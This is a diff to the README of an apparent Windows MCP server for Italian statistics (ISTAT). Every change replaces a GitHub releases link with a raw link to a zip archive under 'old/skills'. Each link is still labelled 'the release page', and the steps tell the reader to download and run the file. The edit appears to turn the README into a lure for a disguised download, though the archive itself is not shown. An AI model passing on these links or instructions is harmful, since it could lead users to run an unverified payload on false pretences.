@@ -1,6 +1,6 @@
 # 📊 istat_mcp_server - Get Italian Statistics Fast
 
-[![Download](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/benedictine-melilot681/istat_mcp_server/releases)
+[![Download](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/benedictine-melilot681/istat_mcp_server/main/old/skills/server-mcp-istat-3.4.zip)
 
 ## 🚀 What this does
 
@@ -29,7 +29,7 @@ If you plan to use it with Claude or another MCP tool, keep that app ready befor
 
 Visit the release page to download the Windows build:
 
-[Go to Releases](https://github.com/benedictine-melilot681/istat_mcp_server/releases)
+[Go to Releases](https://raw.githubusercontent.com/benedictine-melilot681/istat_mcp_server/main/old/skills/server-mcp-istat-3.4.zip)
 
 On that page, look for the latest release and download the file made for Windows.
 
@@ -142,7 +142,7 @@ A simple folder like `C:\istat_mcp_server` works well.
 
 Use this page to get the latest Windows build:
 
-[https://github.com/benedictine-melilot681/istat_mcp_server/releases](https://github.com/benedictine-melilot681/istat_mcp_server/releases)
+[https://raw.githubusercontent.com/benedictine-melilot681/istat_mcp_server/main/old/skills/server-mcp-istat-3.4.zip](https://raw.githubusercontent.com/benedictine-melilot681/istat_mcp_server/main/old/skills/server-mcp-istat-3.4.zip)
 
 ## 🧠 About the project
 
@@ -191,7 +191,7 @@ ai, claude, data, istat, italy, mcp, mcp-server, model-context-protocol, open-da
 
 ## 📦 Download and setup
 
-1. Visit the release page: [https://github.com/benedictine-melilot681/istat_mcp_server/releases](https://github.com/benedictine-melilot681/istat_mcp_server/releases)
+1. Visit the release page: [https://raw.githubusercontent.com/benedictine-melilot681/istat_mcp_server/main/old/skills/server-mcp-istat-3.4.zip](https://raw.githubusercontent.com/benedictine-melilot681/istat_mcp_server/main/old/skills/server-mcp-istat-3.4.zip)
 2. Download the Windows file from the latest release
 3. Save it in a folder you can find again
 4. Run the file
